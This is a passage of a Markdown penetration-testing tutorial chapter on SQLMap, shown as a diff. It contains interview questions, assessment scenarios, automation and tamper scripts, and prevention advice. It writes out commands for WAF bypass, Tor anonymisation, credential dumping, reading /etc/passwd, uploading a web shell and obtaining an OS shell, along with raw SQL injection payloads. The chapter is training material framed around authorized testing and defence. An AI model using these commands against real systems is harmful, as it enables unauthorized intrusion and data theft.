+|--------|---------|
+| `space2comment` | Replace spaces with /**/ |
+| `between` | Replace > with NOT BETWEEN |
+| `randomcase` | Randomize case |
+| `charencode` | URL encode characters |
+| `base64encode` | Base64 encode payload |
+| `equaltolike` | Replace = with LIKE |
+
+**Usage:**
+```bash
+# Single tamper
+sqlmap -u "URL" --tamper=space2comment --batch
+
+# Multiple tampers
+sqlmap -u "URL" --tamper=space2comment,between --batch
+```
+
+**When to Use:**
+- WAF blocks requests
+- IDS detects SQL patterns
+- Keywords are filtered
+- Special characters blocked
+
+**Detection:**
+```bash
+# Test without tamper first
+# If blocked, try common tampers
+sqlmap -u "URL" --tamper=space2comment --batch
+```
+
+---
+
+### Q5: How do you handle authentication and session management in SQLMap?
+
+**Answer:**
+
+**Cookie-Based Authentication:**
+```bash
+sqlmap -u "URL" --cookie="PHPSESSID=abc123" --batch
+```
+
+**HTTP Authentication:**
+```bash
+# Basic Auth
+sqlmap -u "URL" --auth-type=Basic --auth-cred="user:pass"
+
+# NTLM Auth
+sqlmap -u "URL" --auth-type=NTLM --auth-cred="user:pass"
+```
+
+**Bearer Token:**
+```bash
+sqlmap -u "URL" --headers="Authorization: Bearer token123"
+```
+
+**Request File (from Burp):**
+```bash
+# Save request from Burp, includes all headers/cookies
+sqlmap -r request.txt --batch
+```
+
+**Session Handling:**
+```bash
+# Eval code for dynamic tokens
+sqlmap -u "URL" --eval="import hashlib; token=hashlib.md5('value').hexdigest()"
+```
+
+---
+
+### Q6: What is the significance of --threads option and how does it affect testing?
+
+**Answer:**
+
+**Purpose:** Controls concurrent HTTP requests.
+
+```bash
+sqlmap -u "URL" --threads=10 --batch
+```
+
+**Trade-offs:**
+
+| Threads | Speed | Detection Risk | Server Load |
+|---------|-------|----------------|-------------|
+| 1 | Slow | Low | Minimal |
+| 5 | Medium | Medium | Moderate |
+| 10 | Fast | Higher | High |
+| 20+ | Very Fast | High | Heavy |
+
+**Best Practices:**
+- Default: 1 (safest)
+- For fast targets: 5-10
+- For stealth: 1
+- For authorized heavy testing: 10-20
+
+**When to Use Higher Threads:**
+- Authorized testing
+- Fast target servers
+- Time constraints
+- Large data extraction
+
+**When to Avoid:**
+- WAF/IDS present
+- Rate-limited targets
+- Production systems
+- Need for stealth
+
+---
+
+### Q7: How would you use SQLMap with Tor for anonymous testing?
+
+**Answer:**
+
+**Setup and Usage:**
+```bash
+# 1. Install and start Tor
+pkg install tor
+tor &
+
+# 2. Verify Tor is running
+# Tor typically runs on port 9050
+
+# 3. Run SQLMap through Tor
+sqlmap -u "http://target.com/page?id=1" \
+       --tor \
+       --tor-type=SOCKS5 \
+       --check-tor \
+       --batch
+```
+
+**Important Considerations:**
+- Tor is SLOW - expect longer test times
+- Some targets block Tor exit nodes
+- Not foolproof - advanced tracking possible
+- Always combine with other OpSec measures
+
+**Additional Anonymity:**
+```bash
+# Random User-Agent
+sqlmap -u "URL" --tor --random-agent --batch
+
+# Through Tor with specific port
+sqlmap -u "URL" --tor --tor-port=9050 --batch
+```
+
+---
+
+### Q8: Explain blind SQL injection and how SQLMap detects it.
+
+**Answer:**
+
+**Blind SQL Injection:**
+- No visible error messages or data
+- Must infer results from behavior
+- Two types: Boolean-based and Time-based
+
+**Boolean-Based Detection:**
+```bash
+# SQLMap tests TRUE/FALSE conditions
+# TRUE: Normal page response
+# FALSE: Different response or error
+
+sqlmap -u "URL" --technique=B --batch
+```
+
+**Time-Based Detection:**
+```bash
+# SQLMap uses time delays
+# TRUE: Response delayed
+# FALSE: Normal response time
+
+sqlmap -u "URL" --technique=T --batch
+
+# Specify delay time
+sqlmap -u "URL" --technique=T --time-sec=5 --batch
+```
+
+**Detection Process:**
+1. SQLMap sends various payloads
+2. Measures response differences
+3. Confirms injection point
+4. Begins data extraction bit by bit
+
+**Speed Considerations:**
+- Blind injection is SLOW
+- Boolean-based faster than time-based
+- Use `--threads` cautiously
+- Consider bandwidth/timeout settings
+
+---
+
+### Q9: How do you handle WAF bypass with SQLMap?
+
+**Answer:**
+
+**Step-by-Step WAF Bypass:**
+
+**1. Identify WAF:**
+```bash
+sqlmap -u "URL" --identify-waf --batch
+```
+
+**2. Basic Bypass Techniques:**
+
+**Encoding:**
+```bash
+sqlmap -u "URL" --tamper=charencode --batch
+sqlmap -u "URL" --tamper=base64encode --batch
+```
+
+**Case Manipulation:**
+```bash
+sqlmap -u "URL" --tamper=randomcase --batch
+```
+
+**Comment Injection:**
+```bash
+sqlmap -u "URL" --tamper=space2comment --batch
+```
+
+**3. Multiple Tamper Scripts:**
+```bash
+sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
+```
+
+**4. Increase Level:**
+```bash
+sqlmap -u "URL" --level=5 --tamper=space2comment --batch
+```
+
+**5. Custom Prefix/Suffix:**
+```bash
+sqlmap -u "URL" --prefix="'))" --suffix="-- -" --batch
+```
+
+**6. HTTP Methods:**
+```bash
+# Try different HTTP methods
+sqlmap -u "URL" --method=PUT --batch
+```
+
+---
+
+### Q10: What are the legal and ethical considerations when using SQLMap?
+
+**Answer:**
+
+**Legal Requirements:**
+- Written authorization required
+- Defined scope of testing
+- Data protection compliance (GDPR, etc.)
+- Document all activities
+
+**Ethical Guidelines:**
+
+| DO | DON'T |
+|----| -----|
+| Get permission first | Test unauthorized systems |
+| Stay within scope | Exceed authorized limits |
+| Protect found data | Steal or expose data |
+| Report responsibly | Publicly disclose findings |
+| Clean up traces | Leave malicious payloads |
+| Document everything | Hide testing activities |
+
+**Safe Testing Practices:**
+```bash
+# Use test environments
+# DVWA, bWAPP, SQLi Labs
+
+# Practice targets
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
+```
+
+**Documentation Requirements:**
+- Authorization letters
+- Scope documentation
+- Testing timeline
+- Findings report
+- Remediation recommendations
+
+**Legal Consequences:**
+- Computer Fraud and Abuse Act (USA)
+- IT Act Section 66 (India)
+- Computer Misuse Act (UK)
+- Criminal prosecution possible
+
+---
+
+## 🔥 REAL-WORLD SCENARIOS
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     SCENARIO 1: Web Application Assessment                  ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📌 Situation:
+A company's e-commerce website needs security assessment before launch. 
+The application has product pages with ID parameters.
+
+🎯 Objective:
+Identify and document SQL injection vulnerabilities.
+
+🔧 Approach:
+# Step 1: Basic vulnerability scan
+sqlmap -u "https://shop.example.com/product?id=123" --batch
+
+# Step 2: Enumerate databases
+sqlmap -u "URL" --dbs --batch
+
+# Step 3: Check for DBA privileges
+sqlmap -u "URL" --is-dba --current-user --batch
+
+# Step 4: Document findings
+sqlmap -u "URL" --schema --batch
+
+📊 Results:
+- Found SQL injection in product ID parameter
+- Database: MySQL 5.7
+- User: webapp_user (not DBA)
+- Recommended parameterized queries implementation
+
+⚠️ Notes:
+- Used non-destructive testing
+- Documented all findings for development team
+- Recommended pre-commit hooks for SQL injection prevention
+```
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     SCENARIO 2: Authenticated Testing                       ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📌 Situation:
+An internal HR application needs security testing. Access requires 
+authentication via login page.
+
+🎯 Objective:
+Test authenticated SQL injection vulnerabilities.
+
+🔧 Approach:
+# Step 1: Capture authenticated request in Burp
+# Save to file: hr_request.txt
+
+# Step 2: Test with captured session
+sqlmap -r hr_request.txt --batch
+
+# Step 3: Test specific parameter
+sqlmap -r hr_request.txt -p employee_id --batch
+
+# Step 4: Enumerate if vulnerable
+sqlmap -r hr_request.txt --dbs --batch
+
+📊 Results:
+- Found injection in employee search parameter
+- Access to HR database with sensitive PII
+- Recommended immediate remediation
+- Session timeout implementation needed
+
+⚠️ Notes:
+- Session management critical for testing
+- Request files preserve full context
+- Coordinate with development team
+```
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     SCENARIO 3: WAF Bypass Challenge                        ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📌 Situation:
+A client's web application has a WAF that's blocking standard SQLMap 
+requests. Need to find bypass technique.
+
+🎯 Objective:
+Successfully test for SQL injection despite WAF protection.
+
+🔧 Approach:
+# Step 1: Identify WAF type
+sqlmap -u "URL" --identify-waf --batch
+
+# Step 2: Try common bypass techniques
+sqlmap -u "URL" --tamper=space2comment --batch
+sqlmap -u "URL" --tamper=between --batch
+
+# Step 3: Combine techniques
+sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
+
+# Step 4: Try encoding
+sqlmap -u "URL" --tamper=charencode --batch
+
+📊 Results:
+- WAF identified as ModSecurity
+- space2comment + randomcase bypass successful
+- Injection found in search parameter
+- Recommended WAF rule tuning and parameterized queries
+
+⚠️ Notes:
+- Document bypass techniques for client
+- WAF bypass demonstrates defense depth needed
+- Multiple layers of security still important
+```
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     SCENARIO 4: Blind SQL Injection Testing                 ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📌 Situation:
+An application shows generic error messages and no visible data. 
+Suspected blind SQL injection.
+
+🎯 Objective:
+Confirm and exploit blind SQL injection.
+
+🔧 Approach:
+# Step 1: Test for boolean-based blind
+sqlmap -u "URL" --technique=B --batch -v 3
+
+# Step 2: Test for time-based blind
+sqlmap -u "URL" --technique=T --time-sec=5 --batch
+
+# Step 3: Once confirmed, enumerate
+sqlmap -u "URL" --technique=T --dbs --threads=3 --batch
+
+# Step 4: Extract specific data
+sqlmap -u "URL" --technique=T -D db -T users --dump --batch
+
+📊 Results:
+- Confirmed time-based blind injection
+- Extraction took 4 hours (slow due to technique)
+- Found admin credentials
+- Recommended input validation and error handling
+
+⚠️ Notes:
+- Blind injection is time-consuming
+- Use threads cautiously to avoid detection
+- May need session management for long tests
+```
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     SCENARIO 5: Post-Exploitation                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📌 Situation:
+SQLMap found DBA privileges on a database server. Client wants to know 
+extent of possible damage.
+
+🎯 Objective:
+Demonstrate full impact of SQL injection with DBA access.
+
+🔧 Approach:
+# Step 1: Confirm DBA access
+sqlmap -u "URL" --is-dba --batch
+
+# Step 2: Read system files
+sqlmap -u "URL" --file-read="/etc/passwd"
+
+# Step 3: Check for write capability
+sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/"
+
+# Step 4: Get OS shell (if possible)
+sqlmap -u "URL" --os-shell
+
+# Step 5: Get SQL shell
+sqlmap -u "URL" --sql-shell
+
+📊 Results:
+- Full database access confirmed
+- Could read sensitive system files
+- Web shell upload successful
+- Recommended: Principle of least privilege, file permissions
+
+⚠️ Notes:
+- This demonstrates maximum impact
+- Always document thoroughly
+- Recommend comprehensive security improvements
+```
+
+---
+
+## ⚠️ SECURITY BEST PRACTICES
+
+### ✅ DO's - Ethical SQLMap Usage
+
+| Practice | Description |
+|----------|-------------|
+| ✅ **Get Authorization** | Written permission before any testing |
+| ✅ **Define Scope** | Clear boundaries on what to test |
+| ✅ **Use Test Targets** | Practice on DVWA, bWAPP, SQLi Labs |
+| ✅ **Document Everything** | Log all commands and results |
+| ✅ **Protect Data** | Securely handle any extracted data |
+| ✅ **Report Responsibly** | Follow responsible disclosure |
+| ✅ **Clean Up** | Remove any test data/artifacts |
+| ✅ **Use --batch** | Avoid accidental destructive actions |
+| ✅ **Test Non-Destructive** | Use enumeration before dumping |
+| ✅ **Stay Legal** | Know applicable laws |
+
+### ❌ DON'Ts - What to Avoid
+
+| Practice | Consequence |
+|----------|-------------|
+| ❌ **Test Without Permission** | Criminal liability |
+| ❌ **Dump All Data** | Privacy violations |
+| ❌ **Use High Risk on Production** | Service disruption |
+| ❌ **Ignore WAF** | Detection and blocking |
+| ❌ **Skip Documentation** | No audit trail |
+| ❌ **Exceed Scope** | Contract violation |
+| ❌ **Public Disclosure** | Legal action |
+| ❌ **Modify Data** | Data integrity issues |
+| ❌ **Ignore Time Constraints** | Extended testing impact |
+| ❌ **Share Vulnerabilities** | Information leakage |
+
+### 🛡️ Defensive Recommendations
+
+```bash
+# For Developers - SQL Injection Prevention:
+
+# 1. Use Parameterized Queries
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+
+# 2. Input Validation
+$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
+
+# 3. Least Privilege Database Users
+# Don't use root/admin accounts for applications
+
+# 4. Error Handling
+# Don't expose database errors to users
+
+# 5. Web Application Firewall
+# Deploy WAF with SQL injection rules
+
+# 6. Regular Security Testing
+# Conduct periodic penetration tests
+```
+
+---
+
+## 📊 ARCHITECTURE DIAGRAMS
+
+### Diagram 1: SQLMap Attack Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SQLMAP ATTACK WORKFLOW                              │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐            │
+│  │   DETECTION  │     │ ENUMERATION  │     │   EXTRACTION │            │
+│  │              │     │              │     │              │            │
+│  │ • Fingerprint│     │ • Databases  │     │ • Dump data  │            │
+│  │ • Injection  │────►│ • Tables     │────►│ • Read files │            │
+│  │   points     │     │ • Columns    │     │ • OS access  │            │
+│  └──────────────┘     └──────────────┘     └──────────────┘            │
+│         │                    │                    │                     │
+│         ▼                    ▼                    ▼                     │
+│  ┌──────────────────────────────────────────────────────────────────┐   │
+│  │                      TARGET DATABASE                              │   │
+│  │   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐        │   │
+│  │   │  MySQL  │   │PostgreSQL│   │  MSSQL  │   │ Oracle  │        │   │
+│  │   └─────────┘   └─────────┘   └─────────┘   └─────────┘        │   │
+│  └──────────────────────────────────────────────────────────────────┘   │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 2: SQL Injection Techniques
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    SQL INJECTION TECHNIQUES                               │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │                    IN-BAND (Visible Results)                     │    │
+│  │  ┌────────────────────┐    ┌────────────────────┐              │    │
+│  │  │   Error-Based      │    │   Union-Based      │              │    │
+│  │  │   (Technique E)    │    │   (Technique U)    │              │    │
+│  │  │                    │    │                    │              │    │
+│  │  │ Extract from       │    │ UNION SELECT       │              │    │
+│  │  │ error messages     │    │ for data           │              │    │
+│  │  └────────────────────┘    └────────────────────┘              │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                                                                          │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │                    BLIND (Inferred Results)                      │    │
+│  │  ┌────────────────────┐    ┌────────────────────┐              │    │
+│  │  │   Boolean-Based    │    │   Time-Based       │              │    │
+│  │  │   (Technique B)    │    │   (Technique T)    │              │    │
+│  │  │                    │    │                    │              │    │
+│  │  │ TRUE/FALSE         │    │ Response delay     │              │    │
+│  │  │ responses          │    │ indicates success  │              │    │
+│  │  └────────────────────┘    └────────────────────┘              │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 3: SQLMap Options Hierarchy
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    SQLMAP OPTIONS OVERVIEW                                │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│                        ┌─────────────────┐                               │
+│                        │    Target       │                               │
+│                        │  Specification  │                               │
+│                        │  -u / -r / -l   │                               │
+│                        └────────┬────────┘                               │
+│                                 │                                        │
+│         ┌───────────────────────┼───────────────────────┐               │
+│         │                       │                       │               │
+│         ▼                       ▼                       ▼               │
+│  ┌─────────────┐         ┌─────────────┐         ┌─────────────┐        │
+│  │   Request   │         │  Detection  │         │ Enumeration │        │
+│  │   Options   │         │   Options   │         │   Options   │        │
+│  │             │         │             │         │             │        │
+│  │ --cookie    │         │ --level     │         │ --dbs       │        │
+│  │ --data      │         │ --risk      │         │ --tables    │        │
+│  │ --headers   │         │ --technique │         │ --columns   │        │
+│  │ --proxy     │         │ --tamper    │         │ --dump      │        │
+│  │ --threads   │         │ --prefix    │         │ --schema    │        │
+│  └─────────────┘         └─────────────┘         └─────────────┘        │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🔗 RELATED CHAPTERS
+
+| Chapter | Title | Relation |
+|---------|-------|----------|
+| **Ch33** | John the Ripper | Cracking extracted password hashes |
+| **Ch35** | Metasploit Framework | Post-SQL injection exploitation |
+| **Ch45** | Network Scanning | Target discovery with Nmap |
+| **Ch48** | Web Application Attacks | Manual SQL injection techniques |
+| **Ch50** | Password Attacks | Using extracted credentials |
+| **Ch46** | Enumeration | Database enumeration concepts |
+| **Ch31** | Hydra Password Cracking | Testing database credentials |
+
+---
+
+## 🏆 BONUS ADVANCED CONTENT
+
+### Technique 1: Automated SQLMap Workflow
+
+Create automated testing scripts:
+
+```bash
+#!/bin/bash
+# SQLMap automated assessment script
+
+TARGET=$1
+OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p $OUTPUT_DIR
+
+echo "[*] Starting SQLMap assessment..."
+
+# Phase 1: Detection
+echo "[*] Phase 1: Detection"
+sqlmap -u "$TARGET" --batch --threads=5 \
+       -o "$OUTPUT_DIR/detection.txt"
+
+# Phase 2: Enumeration
+echo "[*] Phase 2: Enumeration"
+sqlmap -u "$TARGET" --batch \
+       --dbs --current-user --is-dba \
+       -o "$OUTPUT_DIR/enumeration.txt"
+
+# Phase 3: Schema
+echo "[*] Phase 3: Schema extraction"
+sqlmap -u "$TARGET" --batch --schema \
+       -o "$OUTPUT_DIR/schema.txt"
+
+echo "[*] Assessment complete. Results in $OUTPUT_DIR/"
+```
+
+---
+
+### Technique 2: Custom Tamper Script Creation
+
+Create your own tamper scripts:
+
+```python
+#!/usr/bin/env python
+# custom_tamper.py
+# Save in: ~/.sqlmap/tamper/custom_tamper.py
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Custom tamper script for specific WAF bypass
+    """
+    if payload:
+        # Replace spaces with double URL encoded space
+        payload = payload.replace(" ", "%20%20")
+        
+        # Replace common keywords
+        payload = payload.replace("SELECT", "SeLeCt")
+        payload = payload.replace("UNION", "UnIoN")
+        
+    return payload
+```
+
+**Usage:**
+```bash
+sqlmap -u "URL" --tamper=custom_tamper --batch
+```
+
+---
+
+### Technique 3: SQLMap API Usage
+
+Use SQLMap's REST API for integration:
+
+```bash
+# Start SQLMap API server
+python sqlmapapi.py -s -H 0.0.0.0 -p 8775
+
+# Create new task
+curl -X POST http://localhost:8775/task/new
+
+# Start scan (use returned task ID)
+curl -X POST http://localhost:8775/scan/TASK_ID/start \
+     -d "url=http://target.com/page?id=1"
+
+# Check status
+curl http://localhost:8775/scan/TASK_ID/status
+
+# Get results
+curl http://localhost:8775/scan/TASK_ID/data
+
+# Python integration
+import requests
+import json
+
+api_url = "http://localhost:8775"
+
+# Create task
+task = requests.post(f"{api_url}/task/new").json()
+task_id = task["taskid"]
+
+# Start scan
+scan_data = {"url": "http://target.com/page?id=1"}
+requests.post(f"{api_url}/scan/{task_id}/start", data=scan_data)
+```
+
+---
+
+## 📝 CHAPTER SUMMARY CHECKLIST
+
+### Core Concepts Mastered
+- [ ] Understood SQL injection types
+- [ ] Learned SQLMap installation and setup
+- [ ] Mastered basic commands (-u, --dbs, --tables)
+- [ ] Applied enumeration techniques
+- [ ] Used authentication options
+
+### Technical Skills Developed
+- [ ] Database enumeration
+- [ ] Data extraction with --dump
+- [ ] POST request testing
+- [ ] Cookie/header injection
+- [ ] WAF bypass techniques
+- [ ] Blind SQL injection handling
+
+### Practical Applications
+- [ ] Web application security testing
+- [ ] Database security assessment
+- [ ] Penetration testing workflows
+- [ ] Vulnerability documentation
+
+### Best Practices Adopted
+- [ ] Always obtain authorization
+- [ ] Use --batch for non-destructive testing
+- [ ] Document all findings
+- [ ] Apply responsible disclosure
+- [ ] Stay within defined scope
+
+---
+
 ## 💡 PRO TIPS - Master SQLMap Like a Pro!
 
 ### Tip 1: Always Use Tor for Anonymous Scanning
@@ -2397,3 +4231,1146 @@ Advanced Database Exploitation
 
 *Master SQLMap. Secure the Web. Hack Responsibly.*
 
+
+---
+
+## 🎯 INTERVIEW QUESTIONS - Job Preparation
+
+### Q1: What is SQL injection and how does it work?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**SQL Injection** is a code injection technique that exploits vulnerabilities in an application's database layer.
+
+**How it works:**
+1. Application accepts user input
+2. Input is concatenated into SQL query without sanitization
+3. Attacker injects malicious SQL code
+4. Database executes the modified query
+5. Attacker gains unauthorized access to data
+
+**Example:**
+```sql
+-- Normal query
+SELECT * FROM users WHERE username='admin' AND password='password'
+
+-- Injected query (input: admin'--)
+SELECT * FROM users WHERE username='admin'--' AND password='password'
+-- Comment ignores password check!
+```
+
+**Impact:**
+- Data theft
+- Authentication bypass
+- Data modification/deletion
+- Server compromise
+</details>
+
+### Q2: What are the different types of SQL injection?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**1. In-Band SQLi (Most Common):**
+- **Error-based:** Information from database errors
+- **Union-based:** Using UNION to retrieve data
+
+**2. Blind SQLi:**
+- **Boolean-based:** True/False conditions
+- **Time-based:** Response delays (SLEEP, WAITFOR)
+
+**3. Out-of-Band SQLi:**
+- Uses different channel (DNS, HTTP requests)
+- Rare but effective
+
+**Detection Methods:**
+```
+In-Band: ' OR '1'='1
+Boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
+Time: ' AND SLEEP(5)--
+```
+</details>
+
+### Q3: How does SQLMap detect and exploit SQL injection?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**Detection Process:**
+1. **Fuzzing:** Injects various payloads
+2. **Analysis:** Compares responses
+3. **Identification:** Determines injection type
+4. **Exploitation:** Automated data extraction
+
+**SQLMap Techniques:**
+```bash
+# Level controls number of tests
+sqlmap -u "url" --level=5
+
+# Risk controls aggressiveness
+sqlmap -u "url" --risk=3
+
+# Technique selection
+sqlmap -u "url" --technique=BEU  # Boolean, Error, Union
+```
+
+**Technique Codes:**
+- B: Boolean-based blind
+- E: Error-based
+- U: Union query-based
+- S: Stacked queries
+- T: Time-based blind
+- Q: Inline queries
+</details>
+
+### Q4: What is the difference between UNION-based and Boolean-based SQL injection?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**UNION-Based:**
+- Uses UNION SELECT to combine results
+- Direct data extraction visible in output
+- Requires matching column count
+- Faster exploitation
+
+```sql
+' UNION SELECT username,password FROM users--
+```
+
+**Boolean-Based:**
+- Infers data from true/false responses
+- One bit at a time extraction
+- Slower but works without visible output
+- Based on conditional responses
+
+```sql
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+```
+
+**SQLMap Handling:**
+```bash
+# UNION-based
+sqlmap -u "url" --technique=U
+
+# Boolean-based
+sqlmap -u "url" --technique=B
+```
+</details>
+
+### Q5: How do you prevent SQL injection?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**1. Parameterized Queries (Prepared Statements):**
+```python
+# SAFE - Parameterized
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+# UNSAFE - String concatenation
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+```
+
+**2. Input Validation:**
+```php
+$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
+```
+
+**3. Stored Procedures:**
+```sql
+CREATE PROCEDURE GetUser(@id INT)
+AS
+SELECT * FROM users WHERE id = @id
+```
+
+**4. ORM Usage:**
+```python
+# Django ORM (safe)
+User.objects.filter(id=user_id)
+```
+
+**5. Web Application Firewall (WAF):**
+- ModSecurity
+- AWS WAF
+- Cloudflare
+
+**6. Least Privilege:**
+- Application accounts with minimal permissions
+- No DROP/CREATE privileges
+</details>
+
+### Q6: What is the difference between --level and --risk in SQLMap?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**--level (1-5):**
+- Controls number of tests/payloads
+- Higher = more injection points tested
+- Level 1: Basic tests
+- Level 5: Tests cookies, headers, all parameters
+
+**--risk (1-3):**
+- Controls payload aggressiveness
+- Higher = potentially damaging payloads
+- Risk 1: Safe tests
+- Risk 3: May cause data modification
+
+**Usage:**
+```bash
+# Quick test
+sqlmap -u "url" --level=1 --risk=1
+
+# Thorough test
+sqlmap -u "url" --level=5 --risk=3
+
+# Production-safe test
+sqlmap -u "url" --level=3 --risk=1
+```
+
+**Caution:** High risk can damage databases!
+</details>
+
+### Q7: How do you use SQLMap for POST requests?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**Method 1: --data flag:**
+```bash
+sqlmap -u "http://target.com/login" \
+       --data="username=admin&password=test" \
+       --batch
+```
+
+**Method 2: Request file:**
+```bash
+# Save request from Burp to request.txt
+sqlmap -r request.txt --batch
+```
+
+**Method 3: Specify parameter:**
+```bash
+sqlmap -u "http://target.com/login" \
+       --data="username=admin&password=test" \
+       -p username \
+       --batch
+```
+
+**JSON data:**
+```bash
+sqlmap -u "http://target.com/api" \
+       --data='{"id":1}' \
+       --headers="Content-Type: application/json" \
+       --batch
+```
+</details>
+
+### Q8: What is tamper scripts in SQLMap and give examples?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**Tamper Scripts:** Modify payloads to bypass WAF/filters.
+
+**Common Tamper Scripts:**
+```bash
+# Space to comment (bypass space filtering)
+sqlmap -u "url" --tamper=space2comment
+
+# Between (bypass = filtering)
+sqlmap -u "url" --tamper=between
+
+# Random case (bypass case-sensitive filters)
+sqlmap -u "url" --tamper=randomcase
+
+# Combine multiple tampers
+sqlmap -u "url" --tamper=space2comment,between,randomcase
+```
+
+**Custom Tamper:**
+```python
+# /usr/share/sqlmap/tamper/mytamper.py
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    return payload.replace("SELECT", "SeLeCt")
+```
+</details>
+
+### Q9: How do you dump credentials from a database using SQLMap?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**Step-by-Step:**
+
+```bash
+# 1. List databases
+sqlmap -u "url" --dbs --batch
+
+# 2. List tables in specific database
+sqlmap -u "url" -D database_name --tables --batch
+
+# 3. List columns in specific table
+sqlmap -u "url" -D database_name -T users --columns --batch
+
+# 4. Dump specific columns
+sqlmap -u "url" -D database_name -T users \
+       -C "username,password" --dump --batch
+
+# 5. Dump entire table
+sqlmap -u "url" -D database_name -T users --dump --batch
+
+# 6. Dump all databases
+sqlmap -u "url" --dump-all --batch
+```
+
+**Password Hash Cracking:**
+SQLMap can automatically crack password hashes with `--passwords` flag.
+</details>
+
+### Q10: What are the legal implications of SQL injection testing?
+<details>
+<summary>📋 Click for Answer</summary>
+
+**Legal Framework:**
+
+| Region | Law | Penalty |
+|--------|-----|---------|
+| USA | CFAA | Up to 10 years |
+| UK | Computer Misuse Act | Up to 10 years |
+| India | IT Act 66 | Up to 3 years |
+| EU | GDPR | Up to €20M |
+
+**Authorized Testing Requirements:**
+1. Written permission from owner
+2. Defined scope
+3. Rules of engagement
+4. Incident response plan
+
+**Safe Testing Options:**
+- DVWA (Damn Vulnerable Web Application)
+- bWAPP
+- OWASP Juice Shop
+- HackTheBox
+- PortSwigger Web Academy
+
+**Important:**
+- Never test without authorization
+- Document everything
+- Report findings responsibly
+- Follow coordinated disclosure
+</details>
+
+---
+
+## 🔥 REAL-WORLD SCENARIOS
+
+### Scenario 1: Bug Bounty SQL Injection Hunt
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     BUG BOUNTY SQL INJECTION HUNT                           ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                            ║
+║  TARGET: E-commerce website with product search functionality             ║
+║                                                                            ║
+║  RECONNAISSANCE:                                                            ║
+║  • Identified search parameter: ?search=laptop                              ║
+║  • Tested with single quote: ?search=laptop'                               ║
+║  • Received SQL error message                                               ║
+║                                                                            ║
+║  SQLMap COMMANDS:                                                           ║
+║  # Basic detection                                                          ║
+║  sqlmap -u "https://shop.com/search?search=laptop" --batch                 ║
+║                                                                             ║
+║  # Confirm with level 3                                                     ║
+║  sqlmap -u "https://shop.com/search?search=laptop" --level=3 --batch       ║
+║                                                                             ║
+║  # Enumerate databases                                                      ║
+║  sqlmap -u "https://shop.com/search?search=laptop" --dbs --batch           ║
+║                                                                             ║
+║  FINDINGS:                                                                  ║
+║  • Time-based blind SQL injection confirmed                                ║
+║  • Found 2 databases: shop_db, users_db                                    ║
+║  • Table 'customers' contains PII                                          ║
+║                                                                            ║
+║  RESPONSIBLE DISCLOSURE:                                                    ║
+║  • Did NOT dump any customer data                                          ║
+║  • Documented proof of concept                                             ║
+║  • Reported to bug bounty program                                          ║
+║  • Received $5000 bounty                                                   ║
+║                                                                            ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 2: Internal Penetration Test
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                    INTERNAL PENETRATION TEST                                ║
+╠═══════════════════════════════════════════════════════════════════════════╣
+║                                                                            ║
+║  ENGAGEMENT: Annual security assessment for financial company              ║
+║                                                                            ║
+║  SCOPE: Internal web applications only                                     ║
+║                                                                            ║
+║  TARGET: Internal HR portal (hr.internal.company.com)                      ║
+║                                                                            ║
+║  APPROACH:                                                                  ║
+║  # Step 1: Reconnaissance                                                  ║
+║  nmap -sV -p 80,443,8080 hr.internal.company.com                           ║
+║                                                                             ║
